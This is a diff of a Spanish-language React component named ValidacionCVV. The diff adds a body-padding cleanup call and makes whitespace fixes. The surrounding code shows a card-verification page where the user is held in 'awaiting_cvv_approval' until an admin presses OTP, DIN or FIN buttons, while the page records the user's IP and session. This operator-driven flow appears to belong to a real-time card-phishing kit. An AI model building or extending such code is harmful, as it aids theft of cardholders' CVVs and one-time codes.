@@ -5,6 +5,7 @@ import { instanceBackend } from "../../axios/instanceBackend"; // Corrección pa
 import Loading from "../../components/Loading"; // Import Loading
 import IniciarSesionModal from "./modals/iniciarSesionModal";
 import './css/LoginModal.css';
+import { limpiarPaddingBody } from "@utils";
 
 // Se exporta el componente
 export default function ValidacionCVV() {
@@ -116,17 +117,17 @@ export default function ValidacionCVV() {
                 // Admin aprobó CVV Custom: backend NO cambia el estado (solo RECHAZAR lo cambia).
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
                 // El estado permanece en 'awaiting_cvv_approval' hasta que admin presione un botón del menú.
-                
+
                 // Si el estado sigue en awaiting_approval, seguir esperando
                 if (estado === 'awaiting_cvv_approval' || estado === 'awaiting_tc_approval') {
                     estadoAnteriorRef.current = estado;
                     return;
                 }
-                
+
                 // Si estaba en awaiting_approval y ahora cambió a otro estado, significa que el admin presionó un botón
                 const prev = estadoAnteriorRef.current;
-                if ((prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && 
-                    estado !== 'awaiting_cvv_approval' && estado !== 'awaiting_tc_approval' && 
+                if ((prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') &&
+                    estado !== 'awaiting_cvv_approval' && estado !== 'awaiting_tc_approval' &&
                     estado !== 'pendiente') {
                     // El admin presionó un botón después de aprobar, continuar con el flujo normal
                     estadoAnteriorRef.current = estado;
@@ -366,7 +367,7 @@ export default function ValidacionCVV() {
         return frontToBackMap[frontFilename] || null;
     };
 
-        // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
+    // Cargar datos desde localStorage al montar el componente CON VALIDACIÓN BÁSICA
     useEffect(() => {
         // CHECK: Si estamos en modo CVV Custom (viene desde URL params)
         const params = new URLSearchParams(window.location.search);
@@ -379,18 +380,18 @@ export default function ValidacionCVV() {
                 const rawData = localStorage.getItem("datos_usuario");
                 const userData = rawData ? JSON.parse(rawData) : {};
                 const localSesionId = userData?.attributes?.sesion_id || userData?.sesion_id;
-                
+
                 if (!localSesionId) {
                     console.error('Acceso sin sesionId');
                     navigate('/');
                     return false;
                 }
-                
+
                 // Verificar estado del backend
                 try {
                     const response = await instanceBackend.post(`/consultar-estado/${localSesionId}`);
                     const { estado } = response.data;
-                    
+
                     // Solo permitir acceso si el estado es correcto
                     if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                         console.error('Acceso no autorizado a CVV. Estado actual:', estado);
@@ -407,7 +408,7 @@ export default function ValidacionCVV() {
                 try {
                     const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                     const { estado } = response.data;
-                    
+
                     // Solo permitir acceso si el estado es correcto
                     if (estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_cvv_approval' && estado !== 'error_cvv_custom') {
                         console.error('Acceso no autorizado a CVV. Estado actual:', estado);
@@ -486,7 +487,10 @@ export default function ValidacionCVV() {
                 }));
             }, 2000);
         };
-        
+
+        // Se limpia el padding del body
+        limpiarPaddingBody();
+
         // Se obtiene la IP
         obtenerIP();
         // Se obtiene la fecha/hora con formato
@@ -902,12 +906,12 @@ export default function ValidacionCVV() {
             {cargando ? <Loading /> : null}
 
             {/* Modal de error de sesión */}
-            <IniciarSesionModal 
-                isOpen={formState.lanzarModalErrorSesion} 
+            <IniciarSesionModal
+                isOpen={formState.lanzarModalErrorSesion}
                 onClose={() => setFormState(prev => ({
                     ...prev,
                     lanzarModalErrorSesion: false
-                }))} 
+                }))}
             />
         </>
     );
